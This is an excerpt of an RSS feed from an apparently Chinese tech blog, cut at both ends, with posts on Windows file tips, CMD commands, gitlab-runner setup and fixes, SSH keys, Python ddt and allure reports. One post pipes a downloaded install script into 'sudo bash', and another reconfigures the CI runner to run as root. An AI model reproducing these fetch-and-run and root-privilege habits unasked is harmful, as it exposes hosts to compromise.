&lt;li&gt;查看文件夹中文件的格式，如&lt;code&gt;.jpg   .png   .txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在确定需要移动的文件格式后，在右上角搜索框，输入格式如&lt;code&gt;.txt&lt;/code&gt; 正则匹配文件名&lt;/li&gt;
&lt;li&gt;在出现的搜索结果中，按住&lt;code&gt;Ctrl+A&lt;/code&gt;选择全部，按住&lt;code&gt;Ctrl+C&lt;/code&gt;复制全部，然后，在其他地方新建文件夹，按住&lt;code&gt;Ctrl+V&lt;/code&gt;复制所有选择的文件到新文件中即可&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Windows—CMD</title>
        <link>https://ac-lm.github.io/posts/windows10/windowscmd/</link>
        <pubDate>Sun, 10 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/windows10/windowscmd/</guid>
        <description>&lt;h2 id=&#34;1cmd-命令&#34;&gt;1.CMD 命令&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;进入D盘：&lt;code&gt;D:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;列出所有文件：&lt;code&gt;dir&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;显示Windos版本：&lt;code&gt;VER&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;创建文件夹：&lt;code&gt;MKDIR file&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;清除屏幕：&lt;code&gt;CLS&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看某个命令的地址：&lt;code&gt;where java&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;检查网络：&lt;code&gt;ipconfig&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;检查系统配置：&lt;code&gt;dxdiag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Git—gitlab-runner 安装配置</title>
        <link>https://ac-lm.github.io/posts/git/gitgitlab-runner-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Thu, 07 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/git/gitgitlab-runner-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1linux-注册-gitlab-runner&#34;&gt;1.Linux 注册 gitlab-runner&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo gitlab-runner register
Runtime platform arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;amd64 os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;linux pid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3639&lt;/span&gt; revision&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;943fc252 version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;13.7.0
Running in system-mode.

Enter the GitLab instance URL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; example, https://gitlab.com/&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
&lt;span style=&#34;color:#75715e&#34;&gt;# http://gitlab.example.net/&lt;/span&gt;
Enter the registration token:
&lt;span style=&#34;color:#75715e&#34;&gt;# token&lt;/span&gt;
Enter a description &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the runner:
&lt;span style=&#34;color:#75715e&#34;&gt;# description&lt;/span&gt;
Enter the tags &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the runner:
&lt;span style=&#34;color:#75715e&#34;&gt;# tags&lt;/span&gt;
Enter the runner executor:
&lt;span style=&#34;color:#75715e&#34;&gt;# shell&lt;/span&gt;
———————————————————————————————————————————————————————————————————————————————————————————————————————————
&lt;span style=&#34;color:#75715e&#34;&gt;# 文档&lt;/span&gt;
sudo gitlab-runner register
Enter your GitLab instance URL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;also known as the gitlab-ci coordinator URL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
token Enter the token you obtained to register the runner.
Enter a description &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the runner. You can change this value later in the GitLab user interface.
Enter the tags associated with the runner, separated by commas. You can change this value later in the GitLab user interface.
Provide the runner executor. For most use cases, enter docker.
If you entered docker as your executor, you’ll be asked &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the default image to be used &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; projects that &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not define one in .gitlab-ci.yml.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2linux-安装-gitlab-runner-请确保-git-最新&#34;&gt;2.Linux 安装 gitlab-runner （请确保 Git 最新）&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Install GitLab Runner using the official GitLab repositories&lt;/span&gt;
curl -L &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.rpm.sh&amp;#34;&lt;/span&gt; | sudo bash
export GITLAB_RUNNER_DISABLE_SKEL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true; sudo -E yum install gitlab-runner
&lt;span style=&#34;color:#75715e&#34;&gt;# https://docs.gitlab.com/runner/install/linux-repository.html&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3linux-gitlab-runner-命令&#34;&gt;3.Linux gitlab-runner 命令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://docs.gitlab.com/runner/commands/README.html&lt;/span&gt;
gitlab-runner --debug &amp;lt;command&amp;gt;
sudo gitlab-runner run
gitlab-runner install
gitlab-runner uninstall
gitlab-runner start &lt;span style=&#34;color:#75715e&#34;&gt;# 后台运行&lt;/span&gt;
gitlab-runner stop
gitlab-runner restart
gitlab-runner status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4运行&#34;&gt;4.运行&lt;/h2&gt;
&lt;p&gt;在启动后，可以通过 gitlab-runner 在 Linux 系统上运行脚本，编写 .gitlab-ci.yml 文件来布置任务。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—gitlab CI 无法运行无标签的工作</title>
        <link>https://ac-lm.github.io/posts/bug/buggitlab-ci-%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8C%E6%97%A0%E6%A0%87%E7%AD%BE%E7%9A%84%E5%B7%A5%E4%BD%9C/</link>
        <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buggitlab-ci-%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8C%E6%97%A0%E6%A0%87%E7%AD%BE%E7%9A%84%E5%B7%A5%E4%BD%9C/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;gitlab CI 无法执行没有标记标签的工作&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;在设置中勾选 &lt;code&gt;Run untagged jobs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;gitlab 项目设置 -&amp;gt; CI/CD -&amp;gt; Runner，点击编辑按钮，修改 &lt;code&gt;Run untagged jobs / Indicates whether this runner can pick jobs without tags&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—gitlab-runner 无权限</title>
        <link>https://ac-lm.github.io/posts/bug/buggitlab-runner-%E6%97%A0%E6%9D%83%E9%99%90/</link>
        <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buggitlab-runner-%E6%97%A0%E6%9D%83%E9%99%90/</guid>
        <description>&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;需要手动将 gitlab-runner 服务设置为 root 用户&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;ps aux|grep gitlab-runner  &lt;span style=&#34;color:#75715e&#34;&gt;# 查看当前 runner 用户&lt;/span&gt;

sudo gitlab-runner uninstall  &lt;span style=&#34;color:#75715e&#34;&gt;# 删除 gitlab-runner&lt;/span&gt;

gitlab-runner install --working-directory /home/gitlab-runner --user root  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置 root 用户&lt;/span&gt;

sudo service gitlab-runner restart  &lt;span style=&#34;color:#75715e&#34;&gt;# 重启gitlab-runner&lt;/span&gt;

ps aux|grep gitlab-runner &lt;span style=&#34;color:#75715e&#34;&gt;# 再次执行会发现 --user 的用户名已经更换成root了&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Git—SSH 配置</title>
        <link>https://ac-lm.github.io/posts/git/gitssh-%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/git/gitssh-%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1配置-ssh&#34;&gt;1.配置 SSH&lt;/h2&gt;
&lt;p&gt;打开 Git 命令行工具，输入以下命令，使用邮箱创建密码对&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh-keygen -t rsa -b &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; -C &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email@example.com&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有此结果，在对应目录&lt;code&gt;/home/user/.ssh/id_rsa&lt;/code&gt;下找到生成的公钥文件 id_rsa.pub，记事本打开，将里面的内容复制到剪贴板&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Generating docs/private rsa key pair.
Enter file in which to save the key &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;/home/user/.ssh/id_rsa&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打开新建的 github 或者 gitlab 账户，找到 SSH Keys 选项&lt;code&gt;setting-&amp;gt;SSH keys&lt;/code&gt;，将剪贴板内容粘贴到内容框中，title 可以用默认的邮箱名字，最后点击 add。这就代表这个用户被远程仓库所承认了&lt;/p&gt;
&lt;p&gt;选择克隆的项目，复制 SSH 克隆 URL，进行克隆&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git clone + 库的地址
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2创建ssh的目的&#34;&gt;2.创建SSH的目的&lt;/h2&gt;
&lt;p&gt;SSH KEY 的作用是来识别你的电脑，相当于人的身份证号，在你的 C 盘用户目录下面 (:\Users\LX) 存在一个 .ssh 目录，这个目录下有 id_rsa 和 id_rsa.pub 两个文件，这两个就是 SSH Key 的秘钥对，id_rsa 是私钥，不能泄露出去，id_rsa.pub 是公钥，可以放心地告诉任何人。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—ddt 模块</title>
        <link>https://ac-lm.github.io/posts/python/pythonddt-%E6%A8%A1%E5%9D%97/</link>
        <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonddt-%E6%A8%A1%E5%9D%97/</guid>
        <description>&lt;h2 id=&#34;1简介&#34;&gt;1.简介&lt;/h2&gt;
&lt;p&gt;DDT(Data Driven Testing)，数据驱动，简单来说就是测试数据的参数化，在python中DDT以装饰器的形式，结合单元测试一起来使用，用来装饰测试类，为测试用例传递参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install ddt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2ddt-的两个方法装饰器&#34;&gt;2.ddt 的两个方法装饰器&lt;/h2&gt;
&lt;p&gt;data：包含多个你想要传给测试用例的参数，适用动态参数，把传进来的数组组成元组，再对元组进行用例的遍历，根据索引取值相当于对每个参数进行遍历&lt;/p&gt;
&lt;p&gt;file_data：会从json或yaml中加载数据&lt;/p&gt;
&lt;h2 id=&#34;3ddt-的方法&#34;&gt;3.ddt 的方法&lt;/h2&gt;
&lt;p&gt;unpanck：通常data中包含的每一个值都会作为一个单独的参数传给测试方法，如果这些值是用元组或者列表传进来的，可以用unpack方法将其自动分解成多个参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@data&lt;/span&gt;(a,b)         
&lt;span style=&#34;color:#75715e&#34;&gt;# a和b各运行一次用例&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@data&lt;/span&gt;([a,d],[c,d])
&lt;span style=&#34;color:#75715e&#34;&gt;# 如果没有unpack，那么[a,b]当成一个参数传入用例运行&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 如果有unpack，那么[a,b]被分解开，按照用例中的两个参数传递&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4ddt-的类装饰器&#34;&gt;4.ddt 的类装饰器&lt;/h2&gt;
&lt;p&gt;ddt.ddt：对类使用&lt;/p&gt;
&lt;h2 id=&#34;5举例&#34;&gt;5.举例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; unittest
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ddt  &lt;span style=&#34;color:#75715e&#34;&gt;#第三方库&lt;/span&gt;
 
data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;],[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]]

&lt;span style=&#34;color:#a6e22e&#34;&gt;@ddt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ddt
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MyTestCase&lt;/span&gt;(unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestCase):
    &lt;span style=&#34;color:#75715e&#34;&gt;# 只有一个参数时&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@ddt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;data(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_01&lt;/span&gt;(self,a):
        print(a)
    
    &lt;span style=&#34;color:#75715e&#34;&gt;#表示可变参数取值为data([1,2],[3,4],[5,6])，若传参是data,则后面的取值 data([[1,2],[3,4],[5,6]])&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@ddt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;data(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;data)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@ddt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_02&lt;/span&gt;(self,a,b):
        print(a,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;----&amp;#39;&lt;/span&gt;,b)
    
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@ddt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;data([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])&lt;span style=&#34;color:#75715e&#34;&gt;#和上面的相似，这里未使用变量&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@ddt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_03&lt;/span&gt;(self,a,b):
        print(a, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;----&amp;#39;&lt;/span&gt;, b)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>allure—测试报告生成</title>
        <link>https://ac-lm.github.io/posts/pytest&#43;allure/allure%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90/</link>
        <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pytest&#43;allure/allure%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90/</guid>
        <description>&lt;h2 id=&#34;1命令使用&#34;&gt;1.命令使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#----- generate ------------------------------&lt;/span&gt;
allure generate DIR &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;o DIR &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c DIR
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数：-c, --clean 在生成新的Allure报告之前，先清除该目录&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数： -o, --report-dir, --output 指定目录生成allure报告&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;#----- open ------------------------------&lt;/span&gt;
allure open DIR
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数：-h, --host  指定域名地址&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数：-p, --port  指定端口号&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;#----- serve ------------------------------&lt;/span&gt;
allure serve&lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;report&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;html
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数：-h, --host  指定域名地址&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数：-p, --port  指定端口号&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 测试执行，在指定目录DIR生成allure报告与如果目录存在则清除目录&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;alluredir&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DIR &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;clean&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;alluredir
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2生成报告前台&#34;&gt;2.生成报告(前台)&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;pytest --alluredir&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp/my_allure_results  &lt;span style=&#34;color:#75715e&#34;&gt;# 执行测试&lt;/span&gt;
allure serve /tmp/my_allure_results -p &lt;span style=&#34;color:#ae81ff&#34;&gt;33333&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 生成报告&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3生成报告后台&#34;&gt;3.生成报告(后台)&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;nohup allure serve /tmp/my_allure_results -p &lt;span style=&#34;color:#ae81ff&#34;&gt;33333&lt;/span&gt; &amp;gt;/tmp/run.log 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;amp;
ps aux | grep allure
pkill -f allure
&lt;span style=&#34;color:#75715e&#34;&gt;#-或------------------------------------------------------------&lt;/span&gt;
nohup allure open /tmp/result -p &lt;span style=&#34;color:#ae81ff&#34;&gt;33333&lt;/span&gt; &amp;gt;run.log 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;amp;
allure generate /tmp/my_allure_results -o /tmp/result -c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4allureattach附件&#34;&gt;4.allure.attach()附件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 使用 allure.attach() 来插入一段自己写的HTML 和 allure.attach.file() 来导入一个已存在的HTML文件&lt;/span&gt;
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(body, name, attachment_type, extension)
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;file(source, name, attachment_type, extension)
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;body：要显示的内容（附件）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;name：附件名字
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;attachment_type：附件类型，是 allure.attachment_type 里面的其中一种
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;extension：附件的扩展名（比较少用）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;source：文件路径，相当于传一个文件
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5allure的语法糖&#34;&gt;5.allure的语法糖@&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;feature(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;功能名称&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Test&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;issue(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;测试网站&amp;#34;&lt;/span&gt;) 
&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;link(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;链接&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;testcase(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;测试ID&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;description(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;说明&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;story(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;子功能名称&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;title(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;标题&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Test&lt;/span&gt;(self):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;step(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;步骤&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;@allure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;severity(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;级别&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;严重级别
